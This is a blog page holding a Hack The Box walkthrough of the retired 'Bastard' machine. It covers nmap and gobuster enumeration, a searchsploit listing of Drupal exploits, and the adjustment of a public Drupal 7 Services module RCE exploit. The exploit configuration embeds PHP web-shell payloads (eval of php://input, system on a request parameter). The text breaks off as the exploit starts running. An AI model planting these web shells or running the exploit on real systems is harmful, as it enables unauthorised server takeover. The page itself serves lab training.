<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="author" content="Marco Meli">
  <meta name="description" content="Bastard | Welcome to another retired Hack The Box named Bastard. Initial Nmap ┌─[doluar@parrot]─[~/Documents/htb] └──╼ $nmap -sV -sC -p- 10.10.10.9...">

  <link rel="icon" type="image/png" href="/favicon-16x16.png" sizes="16x16">
  <link rel="icon" type="image/png" href="/favicon-32x32.png" sizes="32x32">  
  <link rel="icon" type="image/png" href="/favicon-96x96.png" sizes="96x96">
  
  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.6/css/bootstrap.min.css" type="text/css" media="all">
  <link rel="stylesheet" href="https://sittingducks.io/theme/css/font.css" type="text/css" media="all">
  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
  <link rel="stylesheet" href="https://sittingducks.io/theme/css/style.css" type="text/css" media="all">

  <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/jquery/1.12.3/jquery.min.js"></script>
  <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/modernizr/2.8.3/modernizr.min.js"></script>
  <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.6/js/bootstrap.min.js"></script>
  <script type="text/javascript" src="https://sittingducks.io/theme/js/functions.min.js"></script>

  
 


<meta name="keywords" content="HackTheBox">


  <title>Bastard</title>

<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-156989597-1', 'auto');
  ga('send', 'pageview');

</script>
  
</head>

<body class="home blog">
  <div>
    <header class="site-header">
      <nav class="navbar navbar-default" role="navigation">
        <div class="container">
          <div class="row">
            <div class="site-navigation-inner col-sm-12">
              <div class="navbar-header">
                <button type="button" class="btn navbar-toggle" data-toggle="collapse" data-target=".navbar-ex1-collapse">
                  <span class="sr-only">Toggle navigation</span>
                  <span class="icon-bar"></span>
                  <span class="icon-bar"></span>
                  <span class="icon-bar"></span>
                </button>
              </div>
              <div class="collapse navbar-collapse navbar-ex1-collapse">
              <ul id="menu-all-pages" class="nav navbar-nav">
                <li class="menu-item"><a href="https://sittingducks.io" >home
<i class="fa  fa-lg"></i></a></li>
              </ul>
              </div>
              <div class="social">   
                <a href="https://linkedin.com/in/marco-meli-12668530/" title="Linkedin" >
<i class="fa fa-linkedin fa-lg"></i></a>
              </div>
            </div>
          </div>
        </div>
      </nav><!-- .site-navigation -->

      <div class="container">
      <div id="logo">
        <span class="site-name"><a class="navbar-brand" href="https://sittingducks.io"><img width="310" src="images/logo.png" class="attachment-full size-full" alt="logo">          </a>
        </span><!-- end of .site-name -->
      </div><!-- end of #logo -->
        <div class="tagline">
                <a href="https://sittingducks.io/tag/cheatsheets.html" >CheatSheets (1)</a> &#124; 
                <a href="https://sittingducks.io/tag/hackthebox.html" >HackTheBox (12)</a> &#124; 
                <a href="https://sittingducks.io/tag/vulnhub.html" >VulnHub (1)</a> &#124; 
                <a href="https://sittingducks.io/archives.html" >Archives (14)</a>
        </div>
    </div>

  </header><!-- #masthead -->
  </div>
    <div id="content" class="site-content">
      <div class="container main-content-area">
        <div class="row">
          <div class="main-content-inner col-sm-12 col-md-12">
            <div id="primary" class="content-area">
              <div id="main" class="site-main" role="main">
                <div class="article-container">
<article>
  <div class="blog-item-wrap">
    <div class="post-inner-content">
      <header class="entry-header page-header">
        <span class="cat-item"><time datetime="2020-04-07 22:06:00+01:00">Tue 07 April 2020</time></span>
        <h1 class="entry-title"><a href="https://sittingducks.io/Bastard.html">Bastard</a></h1>
      </header><!-- .entry-header -->
      <div class="fb-like" data-href="https://sittingducks.io/Bastard.html" data-layout="standard" data-action="like" data-show-faces="false" data-share="true"></div>
      <div class="entry-content">
        <p>Welcome to another retired Hack The Box named Bastard. </p>
<h1>Initial Nmap</h1>
<div class="highlight"><pre><span></span><span class="err">┌─</span><span class="o">[</span><span class="n">doluar@parrot</span><span class="o">]</span><span class="err">─</span><span class="o">[</span><span class="n">~/Documents/htb</span><span class="o">]</span><span class="w"></span>
<span class="err">└──╼</span><span class="w"> </span><span class="err">$</span><span class="n">nmap</span><span class="w"> </span><span class="o">-</span><span class="n">sV</span><span class="w"> </span><span class="o">-</span><span class="n">sC</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="o">-</span><span class="w"> </span><span class="mf">10.10.10.9</span><span class="w"></span>
<span class="n">Starting</span><span class="w"> </span><span class="n">Nmap</span><span class="w"> </span><span class="mf">7.80</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="nl">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="p">.</span><span class="n">org</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="k">at</span><span class="w"> </span><span class="mi">2020</span><span class="o">-</span><span class="mi">04</span><span class="o">-</span><span class="mi">07</span><span class="w"> </span><span class="mi">22</span><span class="err">:</span><span class="mi">04</span><span class="w"> </span><span class="n">BST</span><span class="w"></span>
<span class="n">Nmap</span><span class="w"> </span><span class="n">scan</span><span class="w"> </span><span class="n">report</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="mf">10.10.10.9</span><span class="w"></span>
<span class="k">Host</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">up</span><span class="w"> </span><span class="p">(</span><span class="mf">0.097</span><span class="n">s</span><span class="w"> </span><span class="n">latency</span><span class="p">).</span><span class="w"></span>
<span class="ow">Not</span><span class="w"> </span><span class="nl">shown</span><span class="p">:</span><span class="w"> </span><span class="mi">65532</span><span class="w"> </span><span class="n">filtered</span><span class="w"> </span><span class="n">ports</span><span class="w"></span>
<span class="n">PORT</span><span class="w">      </span><span class="k">STATE</span><span class="w"> </span><span class="n">SERVICE</span><span class="w"> </span><span class="n">VERSION</span><span class="w"></span>
<span class="mi">80</span><span class="o">/</span><span class="n">tcp</span><span class="w">    </span><span class="k">open</span><span class="w">  </span><span class="n">http</span><span class="w">    </span><span class="n">Microsoft</span><span class="w"> </span><span class="n">IIS</span><span class="w"> </span><span class="n">httpd</span><span class="w"> </span><span class="mf">7.5</span><span class="w"></span>
<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="nl">generator</span><span class="p">:</span><span class="w"> </span><span class="n">Drupal</span><span class="w"> </span><span class="mi">7</span><span class="w"> </span><span class="p">(</span><span class="nl">http</span><span class="p">:</span><span class="o">//</span><span class="n">drupal</span><span class="p">.</span><span class="n">org</span><span class="p">)</span><span class="w"></span>
<span class="o">|</span><span class="w"> </span><span class="n">http</span><span class="o">-</span><span class="nl">methods</span><span class="p">:</span><span class="w"> </span>
<span class="o">|</span><span class="n">_</span><span class="w">  </span><span class="n">Potentially</span><span class="w"> </span><span class="n">risky</span><span class="w"> </span><span class="nl">methods</span><span class="p">:</span><span class="w"> </span><span class="n">TRACE</span><span class="w"></span>
<span class="o">|</span><span class="w"> </span><span class="n">http</span><span class="o">-</span><span class="n">robots</span><span class="p">.</span><span class="nl">txt</span><span class="p">:</span><span class="w"> </span><span class="mi">36</span><span class="w"> </span><span class="n">disallowed</span><span class="w"> </span><span class="n">entries</span><span class="w"> </span><span class="p">(</span><span class="mi">15</span><span class="w"> </span><span class="n">shown</span><span class="p">)</span><span class="w"></span>
<span class="o">|</span><span class="w"> </span><span class="o">/</span><span class="n">includes</span><span class="o">/</span><span class="w"> </span><span class="o">/</span><span class="n">misc</span><span class="o">/</span><span class="w"> </span><span class="o">/</span><span class="n">modules</span><span class="o">/</span><span class="w"> </span><span class="o">/</span><span class="n">profiles</span><span class="o">/</span><span class="w"> </span><span class="o">/</span><span class="n">scripts</span><span class="o">/</span><span class="w"> </span>
<span class="o">|</span><span class="w"> </span><span class="o">/</span><span class="n">themes</span><span class="o">/</span><span class="w"> </span><span class="o">/</span><span class="n">CHANGELOG</span><span class="p">.</span><span class="n">txt</span><span class="w"> </span><span class="o">/</span><span class="n">cron</span><span class="p">.</span><span class="n">php</span><span class="w"> </span><span class="o">/</span><span class="n">INSTALL</span><span class="p">.</span><span class="n">mysql</span><span class="p">.</span><span class="n">txt</span><span class="w"> </span>
<span class="o">|</span><span class="w"> </span><span class="o">/</span><span class="n">INSTALL</span><span class="p">.</span><span class="n">pgsql</span><span class="p">.</span><span class="n">txt</span><span class="w"> </span><span class="o">/</span><span class="n">INSTALL</span><span class="p">.</span><span class="n">sqlite</span><span class="p">.</span><span class="n">txt</span><span class="w"> </span><span class="o">/</span><span class="n">install</span><span class="p">.</span><span class="n">php</span><span class="w"> </span><span class="o">/</span><span class="n">INSTALL</span><span class="p">.</span><span class="n">txt</span><span class="w"> </span>
<span class="o">|</span><span class="n">_</span><span class="o">/</span><span class="n">LICENSE</span><span class="p">.</span><span class="n">txt</span><span class="w"> </span><span class="o">/</span><span class="n">MAINTAINERS</span><span class="p">.</span><span class="n">txt</span><span class="w"></span>
<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="nl">header</span><span class="p">:</span><span class="w"> </span><span class="n">Microsoft</span><span class="o">-</span><span class="n">IIS</span><span class="o">/</span><span class="mf">7.5</span><span class="w"></span>
<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="nl">title</span><span class="p">:</span><span class="w"> </span><span class="n">Welcome</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="mf">10.10.10.9</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="mf">10.10.10.9</span><span class="w"></span>
<span class="mi">135</span><span class="o">/</span><span class="n">tcp</span><span class="w">   </span><span class="k">open</span><span class="w">  </span><span class="n">msrpc</span><span class="w">   </span><span class="n">Microsoft</span><span class="w"> </span><span class="n">Windows</span><span class="w"> </span><span class="n">RPC</span><span class="w"></span>
<span class="mi">49154</span><span class="o">/</span><span class="n">tcp</span><span class="w"> </span><span class="k">open</span><span class="w">  </span><span class="n">msrpc</span><span class="w">   </span><span class="n">Microsoft</span><span class="w"> </span><span class="n">Windows</span><span class="w"> </span><span class="n">RPC</span><span class="w"></span>
<span class="n">Service</span><span class="w"> </span><span class="nl">Info</span><span class="p">:</span><span class="w"> </span><span class="nl">OS</span><span class="p">:</span><span class="w"> </span><span class="n">Windows</span><span class="p">;</span><span class="w"> </span><span class="nl">CPE</span><span class="p">:</span><span class="w"> </span><span class="nl">cpe</span><span class="p">:</span><span class="o">/</span><span class="nl">o</span><span class="p">:</span><span class="nl">microsoft</span><span class="p">:</span><span class="n">windows</span><span class="w"></span>

<span class="n">Service</span><span class="w"> </span><span class="n">detection</span><span class="w"> </span><span class="n">performed</span><span class="p">.</span><span class="w"> </span><span class="n">Please</span><span class="w"> </span><span class="n">report</span><span class="w"> </span><span class="ow">any</span><span class="w"> </span><span class="n">incorrect</span><span class="w"> </span><span class="n">results</span><span class="w"> </span><span class="k">at</span><span class="w"> </span><span class="nl">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="p">.</span><span class="n">org</span><span class="o">/</span><span class="n">submit</span><span class="o">/</span><span class="w"> </span><span class="p">.</span><span class="w"></span>
<span class="n">Nmap</span><span class="w"> </span><span class="nl">done</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">IP</span><span class="w"> </span><span class="n">address</span><span class="w"> </span><span class="p">(</span><span class="mi">1</span><span class="w"> </span><span class="k">host</span><span class="w"> </span><span class="n">up</span><span class="p">)</span><span class="w"> </span><span class="n">scanned</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="mf">321.27</span><span class="w"> </span><span class="n">seconds</span><span class="w"></span>
</pre></div>


<p>From the nmap output we understand there is an IIS web server v7.5 running on port 80. Therefore we can deduct we are dealing with a Windows machine. A quick search on <a href="https://wpscan.org/">Wikipedia</a> tells us that IIS 7.5 IIS 7.5 was included in Windows 7 and Windows Server 2008 R2, so we are potentially deailng with one of these versions. </p>
<p>Nmap also reveals that Drupal 7 (a popular cms) is running on IIS. Browing the websites gives this result:</p>
<p><img alt="" src="../images/bastard-drupal.png"></p>
<p>I also check the robots.txt file at http://10.10.10.9/robots.txt which pointed me to look at the http://10.10.10.9/CHANGELOG.txt which confirmed Drupal version is 7.54:</p>
<div class="highlight"><pre><span></span><span class="gh">Drupal 7.54, 2017-02-01</span>
<span class="gh">-----------------------</span>
<span class="m">-</span> Modules are now able to define theme engines (API addition:
  https://www.drupal.org/node/2826480).
<span class="m">-</span> Logging of searches can now be disabled (new option in the administrative
  interface).
<span class="m">-</span> Added menu tree render structure to (pre-)process hooks for theme_menu_tree()
  (API addition: https://www.drupal.org/node/2827134).
<span class="m">-</span> Added new function for determining whether an HTTPS request is being served
  (API addition: https://www.drupal.org/node/2824590).
<span class="m">-</span> Fixed incorrect default value for short and medium date formats on the date
  type configuration page.
<span class="m">-</span> File validation error message is now removed after subsequent upload of valid
  file.
<span class="m">-</span> Numerous bug fixes.
<span class="m">-</span> Numerous API documentation improvements.
<span class="m">-</span> Additional performance improvements.
<span class="m">-</span> Additional automated test coverage.
</pre></div>


<p>Before doing any kind of manual scanning it's always best practice to look for known exaploits which can save us precious time. Looking for Drupal exploits with searchsploit cli we have this:</p>
<div class="highlight"><pre><span></span><span class="err">┌─[doluar@parrot]─[~/Documents/htb]</span>
<span class="err">└──╼ $searchsploit drupal 7</span>
<span class="err">-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------</span>
<span class="err"> Exploit Title                                                                                                                                                                                          |  Path</span>
<span class="err">                                                                                                                                                                                                        | (/usr/share/exploitdb/)</span>
<span class="err">-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------</span>
<span class="err">Drupal 4.7 - &#39;Attachment mod_mime&#39; Remote Command Execution                                                                                                                                             | exploits/php/webapps/1821.php</span>
<span class="err">Drupal 4.x - URL-Encoded Input HTML Injection                                                                                                                                                           | exploits/php/webapps/27020.txt</span>
<span class="err">Drupal 7.0 &lt; 7.31 - &#39;Drupalgeddon&#39; SQL Injection (Add Admin User)                                                                                                                                       | exploits/php/webapps/34992.py</span>
<span class="err">Drupal 7.0 &lt; 7.31 - &#39;Drupalgeddon&#39; SQL Injection (Admin Session)                                                                                                                                        | exploits/php/webapps/44355.php</span>
<span class="err">Drupal 7.0 &lt; 7.31 - &#39;Drupalgeddon&#39; SQL Injection (PoC) (Reset Password) (1)                                                                                                                             | exploits/php/webapps/34984.py</span>
<span class="err">Drupal 7.0 &lt; 7.31 - &#39;Drupalgeddon&#39; SQL Injection (PoC) (Reset Password) (2)                                                                                                                             | exploits/php/webapps/34993.php</span>
<span class="err">Drupal 7.0 &lt; 7.31 - &#39;Drupalgeddon&#39; SQL Injection (Remote Code Execution)                                                                                                                                | exploits/php/webapps/35150.php</span>
<span class="err">Drupal 7.12 - Multiple Vulnerabilities                                                                                                                                                                  | exploits/php/webapps/18564.txt</span>
<span class="err">Drupal 7.x Module Services - Remote Code Execution                                                                                                                                                      | exploits/php/webapps/41564.php</span>
<span class="err">Drupal &lt; 4.7.6 - Post Comments Remote Command Execution                                                                                                                                                 | exploits/php/webapps/3313.pl</span>
<span class="err">Drupal &lt; 5.22/6.16 - Multiple Vulnerabilities                                                                                                                                                           | exploits/php/webapps/33706.txt</span>
<span class="err">Drupal &lt; 7.34 - Denial of Service                                                                                                                                                                       | exploits/php/dos/35415.txt</span>
<span class="err">Drupal &lt; 7.58 - &#39;Drupalgeddon3&#39; (Authenticated) Remote Code (Metasploit)                                                                                                                                | exploits/php/webapps/44557.rb</span>
<span class="err">Drupal &lt; 7.58 - &#39;Drupalgeddon3&#39; (Authenticated) Remote Code Execution (PoC)                                                                                                                             | exploits/php/webapps/44542.txt</span>
<span class="err">Drupal &lt; 7.58 / &lt; 8.3.9 / &lt; 8.4.6 / &lt; 8.5.1 - &#39;Drupalgeddon2&#39; Remote Code Execution                                                                                                                     | exploits/php/webapps/44449.rb</span>
<span class="err">Drupal Module CKEditor &lt; 4.1WYSIWYG (Drupal 6.x/7.x) - Persistent Cross-Site Scripting                                                                                                                  | exploits/php/webapps/25493.txt</span>
<span class="err">Drupal Module Coder &lt; 7.x-1.3/7.x-2.6 - Remote Code Execution                                                                                                                                           | exploits/php/remote/40144.php</span>
<span class="err">Drupal Module Cumulus 5.x-1.1/6.x-1.4 - &#39;tagcloud&#39; Cross-Site Scripting                                                                                                                                 | exploits/php/webapps/35397.txt</span>
<span class="err">Drupal Module Drag &amp; Drop Gallery 6.x-1.5 - &#39;upload.php&#39; Arbitrary File Upload                                                                                                                          | exploits/php/webapps/37453.php</span>
<span class="err">Drupal Module Embedded Media Field/Media 6.x : Video Flotsam/Media: Audio Flotsam - Multiple Vulnerabilities                                                                                            | exploits/php/webapps/35072.txt</span>
<span class="err">Drupal Module RESTWS 7.x - PHP Remote Code Execution (Metasploit)                                                                                                                                       | exploits/php/remote/40130.rb</span>
<span class="err">Drupal avatar_uploader v7.x-1.0-beta8 - Arbitrary File Disclosure                                                                                                                                       | exploits/php/webapps/44501.txt</span>
<span class="err">-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------</span>
<span class="c">Shellcodes: No Result</span>
</pre></div>


<p>i think "Drupal 7.x Module Services - Remote Code Execution  --&gt;  exploits/php/webapps/41564.php" is the intended exploit simply because it was available when the box was released in 2017 whereas the other relevant exploits were not. Looking at the code of the exploit I can see there is a quick summary of what it does:</p>
<ol>
<li>Use the SQL Injection to get the contents of the cache for current
endpoint along with admin credentials and hash</li>
<li>Alter the cache to allow us to write a file and do so</li>
<li>Restore the cache</li>
</ol>
<p>There are also some details we have to feed in the script:</p>
<div class="highlight"><pre><span></span><span class="nx">$url</span> <span class="o">=</span> <span class="s1">&#39;http://vmweb.lan/drupal-7.54&#39;</span><span class="p">;</span>
<span class="nx">$endpoint_path</span> <span class="o">=</span> <span class="s1">&#39;/rest_endpoint&#39;</span><span class="p">;</span>
<span class="nx">$endpoint</span> <span class="o">=</span> <span class="s1">&#39;rest_endpoint&#39;</span><span class="p">;</span>

<span class="nx">$file</span> <span class="o">=</span> <span class="p">[</span>
    <span class="s1">&#39;filename&#39;</span> <span class="p">=&gt;</span> <span class="s1">&#39;dixuSOspsOUU.php&#39;</span><span class="p">,</span>
    <span class="s1">&#39;data&#39;</span> <span class="p">=&gt;</span> <span class="err">&#39;</span><span class="cp">&lt;?php</span> <span class="k">eval</span><span class="p">(</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="nx">\</span><span class="s1">&#39;php://input\&#39;)); ?&gt;&#39;</span>
<span class="p">];</span>
</pre></div>


<p>We know the URL but we need to find the rest endpoint and its path. Being lost for a little while I decided to go ahead with my usual next enumeration step, that is directory scanning. Using <code>gobuster</code> I scan until I found <code>/rest</code> (it took ages):</p>
<div class="highlight"><pre><span></span><span class="err">┌─</span><span class="o">[</span><span class="n">doluar@parrot</span><span class="o">]</span><span class="err">─</span><span class="o">[</span><span class="n">~/Documents/htb/boxes/bastard</span><span class="o">]</span><span class="w">                                                                                                                                                                                                </span>
<span class="err">└──╼</span><span class="w"> </span><span class="err">$</span><span class="n">gobuster</span><span class="w"> </span><span class="n">dir</span><span class="w"> </span><span class="c1">--url http://10.10.10.9 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt                                                                                                                                       </span>
<span class="o">===============================================================</span><span class="w">                                                                                                                                                                                  </span>
<span class="n">Gobuster</span><span class="w"> </span><span class="n">v3</span><span class="mf">.0.1</span><span class="w">                                                                                                                                                                                                                                  </span>
<span class="k">by</span><span class="w"> </span><span class="n">OJ</span><span class="w"> </span><span class="n">Reeves</span><span class="w"> </span><span class="p">(</span><span class="nv">@TheColonial</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">Christian</span><span class="w"> </span><span class="n">Mehlmauer</span><span class="w"> </span><span class="p">(</span><span class="nv">@_FireFart_</span><span class="p">)</span><span class="w">                                                                                                                                                                                  </span>
<span class="o">===============================================================</span><span class="w">                                                                                                                                                                                  </span>
<span class="o">[</span><span class="n">+</span><span class="o">]</span><span class="w"> </span><span class="nl">Url</span><span class="p">:</span><span class="w">            </span><span class="nl">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10.10.9</span><span class="w">                                                                                                                                                                                                            </span>
<span class="o">[</span><span class="n">+</span><span class="o">]</span><span class="w"> </span><span class="nl">Threads</span><span class="p">:</span><span class="w">        </span><span class="mi">10</span><span class="w">                                                                                                                                                                                                                           </span>
<span class="o">[</span><span class="n">+</span><span class="o">]</span><span class="w"> </span><span class="nl">Wordlist</span><span class="p">:</span><span class="w">       </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">wordlists</span><span class="o">/</span><span class="n">dirbuster</span><span class="o">/</span><span class="n">directory</span><span class="o">-</span><span class="n">list</span><span class="o">-</span><span class="mf">2.3</span><span class="o">-</span><span class="n">medium</span><span class="p">.</span><span class="n">txt</span><span class="w">                                                                                                                                                                 </span>
<span class="o">[</span><span class="n">+</span><span class="o">]</span><span class="w"> </span><span class="n">Status</span><span class="w"> </span><span class="nl">codes</span><span class="p">:</span><span class="w">   </span><span class="mi">200</span><span class="p">,</span><span class="mi">204</span><span class="p">,</span><span class="mi">301</span><span class="p">,</span><span class="mi">302</span><span class="p">,</span><span class="mi">307</span><span class="p">,</span><span class="mi">401</span><span class="p">,</span><span class="mi">403</span><span class="w">                                                                                                                                                                                                  </span>
<span class="o">[</span><span class="n">+</span><span class="o">]</span><span class="w"> </span><span class="k">User</span><span class="w"> </span><span class="nl">Agent</span><span class="p">:</span><span class="w">     </span><span class="n">gobuster</span><span class="o">/</span><span class="mf">3.0.1</span><span class="w">                                                                                                                                                                                                               </span>
<span class="o">[</span><span class="n">+</span><span class="o">]</span><span class="w"> </span><span class="nl">Timeout</span><span class="p">:</span><span class="w">        </span><span class="mi">10</span><span class="n">s</span><span class="w">                                                                                                                                                                                                                          </span>
<span class="o">===============================================================</span><span class="w">                                                                                                                                                                                  </span>
<span class="mi">2020</span><span class="o">/</span><span class="mi">04</span><span class="o">/</span><span class="mi">08</span><span class="w"> </span><span class="mi">19</span><span class="err">:</span><span class="mi">19</span><span class="err">:</span><span class="mi">33</span><span class="w"> </span><span class="n">Starting</span><span class="w"> </span><span class="n">gobuster</span><span class="w">                                                                                                                                                                                                            </span>
<span class="o">===============================================================</span><span class="w">                                                                                                                                                                                  </span>
<span class="o">/</span><span class="k">search</span><span class="w"> </span><span class="p">(</span><span class="nl">Status</span><span class="p">:</span><span class="w"> </span><span class="mi">403</span><span class="p">)</span><span class="w">                                           </span>
<span class="o">/</span><span class="n">misc</span><span class="w"> </span><span class="p">(</span><span class="nl">Status</span><span class="p">:</span><span class="w"> </span><span class="mi">301</span><span class="p">)</span><span class="w">                                               </span>
<span class="o">/</span><span class="n">themes</span><span class="w"> </span><span class="p">(</span><span class="nl">Status</span><span class="p">:</span><span class="w"> </span><span class="mi">301</span><span class="p">)</span><span class="w"></span>

<span class="o">/</span><span class="mi">0</span><span class="w"> </span><span class="p">(</span><span class="nl">Status</span><span class="p">:</span><span class="w"> </span><span class="mi">200</span><span class="p">)</span><span class="w">                                                                                                                                                                                                                                 </span>
<span class="o">/</span><span class="k">user</span><span class="w"> </span><span class="p">(</span><span class="nl">Status</span><span class="p">:</span><span class="w"> </span><span class="mi">200</span><span class="p">)</span><span class="w">                                                                                                                                                                                                                              </span>
<span class="o">/</span><span class="n">modules</span><span class="w"> </span><span class="p">(</span><span class="nl">Status</span><span class="p">:</span><span class="w"> </span><span class="mi">301</span><span class="p">)</span><span class="w">                                                                                     </span>
<span class="o">/</span><span class="k">admin</span><span class="w"> </span><span class="p">(</span><span class="nl">Status</span><span class="p">:</span><span class="w"> </span><span class="mi">403</span><span class="p">)</span><span class="w">                                                                                                                                                                                                                             </span>
<span class="o">/</span><span class="n">scripts</span><span class="w"> </span><span class="p">(</span><span class="nl">Status</span><span class="p">:</span><span class="w"> </span><span class="mi">301</span><span class="p">)</span><span class="w">                                     </span>
<span class="o">/</span><span class="n">node</span><span class="w"> </span><span class="p">(</span><span class="nl">Status</span><span class="p">:</span><span class="w"> </span><span class="mi">200</span><span class="p">)</span><span class="w">                                                                                                                                                                                                                              </span>
<span class="o">/</span><span class="n">tag</span><span class="w"> </span><span class="p">(</span><span class="nl">Status</span><span class="p">:</span><span class="w"> </span><span class="mi">403</span><span class="p">)</span><span class="w">                                                                                                                                                                                                                               </span>
<span class="o">/</span><span class="k">Search</span><span class="w"> </span><span class="p">(</span><span class="nl">Status</span><span class="p">:</span><span class="w"> </span><span class="mi">403</span><span class="p">)</span><span class="w">                                                                                                                                                                                                                            </span>
<span class="o">/</span><span class="n">sites</span><span class="w"> </span><span class="p">(</span><span class="nl">Status</span><span class="p">:</span><span class="w"> </span><span class="mi">301</span><span class="p">)</span><span class="w">                                                                                                                                                                                                                             </span>
<span class="o">/</span><span class="n">template</span><span class="w"> </span><span class="p">(</span><span class="nl">Status</span><span class="p">:</span><span class="w"> </span><span class="mi">403</span><span class="p">)</span><span class="w">                                                                                                                                                                                                                          </span>
<span class="o">/</span><span class="n">includes</span><span class="w"> </span><span class="p">(</span><span class="nl">Status</span><span class="p">:</span><span class="w"> </span><span class="mi">301</span><span class="p">)</span><span class="w">                                                                                                                                                                                                                          </span>
<span class="o">/</span><span class="n">profiles</span><span class="w"> </span><span class="p">(</span><span class="nl">Status</span><span class="p">:</span><span class="w"> </span><span class="mi">301</span><span class="p">)</span><span class="w"> </span>
<span class="o">/</span><span class="n">rest</span><span class="w"> </span><span class="p">(</span><span class="nl">Status</span><span class="p">:</span><span class="w"> </span><span class="mi">200</span><span class="p">)</span><span class="w"></span>

<span class="o">&lt;</span><span class="n">SNIP</span><span class="o">&gt;</span><span class="w">    </span><span class="o">&lt;</span><span class="n">SNIP</span><span class="o">&gt;</span><span class="w">     </span><span class="o">&lt;</span><span class="n">SNIP</span><span class="o">&gt;</span><span class="w"></span>
</pre></div>


<p>and when I browsed to that file I see this:</p>
<div class="highlight"><pre><span></span><span class="err">┌─[✗]─[doluar@parrot]─[~/Documents/htb/boxes/bastard]</span>
<span class="err">└──╼ $curl http://10.10.10.9/rest</span>
<span class="err">Services Endpoint &quot;rest_endpoint&quot; has been setup successfully.</span>
</pre></div>


<p>So it looks like we found the rest endpoint name and path so we will replace the details of the script as below:</p>
<div class="highlight"><pre><span></span><span class="nx">$url</span> <span class="o">=</span> <span class="s1">&#39;http://10.10.10.9&#39;</span><span class="p">;</span>
<span class="nx">$endpoint_path</span> <span class="o">=</span> <span class="s1">&#39;/rest&#39;</span><span class="p">;</span>
<span class="nx">$endpoint</span> <span class="o">=</span> <span class="s1">&#39;rest_endpoint&#39;</span><span class="p">;</span>

<span class="nx">$file</span> <span class="o">=</span> <span class="p">[</span>
    <span class="s1">&#39;filename&#39;</span> <span class="p">=&gt;</span> <span class="s1">&#39;41564.php&#39;</span><span class="p">,</span>
    <span class="s1">&#39;data&#39;</span> <span class="p">=&gt;</span> <span class="s1">&#39;</span><span class="cp">&lt;?php</span> <span class="nb">system</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&quot;cmd&quot;</span><span class="p">]);</span> <span class="cp">?&gt;</span><span class="s1">&#39;</span>
</pre></div>


<p>I executed the script but I got an error which after some research I found I had to install <code>php-curl</code>. Another error was related to the fact that a comment at line 15 and another at line 70 of the script had wrapped onto the next line. I fixed both issues and ran the script again:</p>
<div class="highlight"><pre><span></span><span class="err">┌─</span><span class="o">[</span><span class="n">doluar@parrot</span><span class="o">]</span><span class="err">─</span><span class="o">[</span><span class="n">~/Documents/htb/boxes/bastard</span><span class="o">]</span><span class="w"></span>
<span class="err">└──╼</span><span class="w"> </span><span class="err">$</span><span class="n">php</span><span class="w"> </span><span class="mf">41564.</span><span class="n">php</span><span class="w"> </span>
<span class="err">#</span><span class="w"> </span><span class="n">Exploit</span><span class="w"> </span><span class="nl">Title</span><span class="p">:</span><span class="w"> </span><span class="n">Drupal</span><span class="w"> </span><span class="mf">7.</span><span class="n">x</span><span class="w"> </span><span class="n">Services</span><span class="w"> </span><span class="k">Module</span><span class="w"> </span><span class="n">Remote</span><span class="w"> </span><span class="n">Code</span><span class="w"> </span><span class="n">Execution</span><span class="w"></span>
<span class="err">#</span><span class="w"> </span><span class="n">Vendor</span><span class="w"> </span><span class="nl">Homepage</span><span class="p">:</span><span class="w"> </span><span class="nl">https</span><span class="p">:</span><span class="o">//</span><span class="n">www</span><span class="p">.</span><span class="n">drupal</span><span class="p">.</span><span class="n">org</span><span class="o">/</span><span class="n">project</span><span class="o">/</span><span class="n">services</span><span class="w"></span>
<span class="err">#</span><span class="w"> </span><span class="n">Exploit</span><span class="w"> </span><span class="nl">Author</span><span class="p">:</span><span class="w"> </span><span class="n">Charles</span><span class="w"> </span><span class="n">FOL</span><span class="w"></span>
<span class="err">#</span><span class="w"> </span><span class="nl">Contact</span><span class="p">:</span><span class="w"> </span><span class="nl">https</span><span class="p">:</span><span class="o">//</span><span class="n">twitter</span><span class="p">.</span><span class="n">com</span><span class="o">/</span><span class="n">ambionics</span><span class="w"> </span>
